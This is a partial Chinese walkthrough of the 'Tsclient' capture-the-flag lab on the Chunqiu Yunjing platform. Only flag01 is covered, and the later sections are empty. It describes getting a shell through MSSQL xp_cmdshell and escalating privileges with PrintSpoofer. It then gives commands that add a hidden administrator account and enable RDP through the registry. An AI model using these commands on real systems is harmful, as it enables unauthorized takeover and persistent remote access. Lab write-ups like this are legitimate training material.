---
title: 春秋云镜Tsclient
date: 2025-03-30 14:32:20
tags:
---

# Tsclient

## 一、简介

![](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/1.png)



## 二、flag01

打开环境，探测端口



fscan扫描发现mssql服务开启

![](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/2.png)

使用mdtu连接上去，先激活xpcmdshell，再执行命令，得到当前用户是mssqlserver

![](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/3.png)

![](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Tsclient/4.png)

接下来用土豆提权，使用几个土豆都报错，最后使用PrintSpoofer提权成功

```
PrintSpoofer64.exe -c -i cmd
```

接下来肯定是要添加上一个管理员用户并打开3389端口，方便后面远程桌面连接上去



```
net user myiiing qwer1234! /add
net localgroup administrators myiiing /add
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

`flag01`在`Adminstrator`文件夹下面



后续时间到了，等后面会更新

## 二、flag02





## 三、flag03

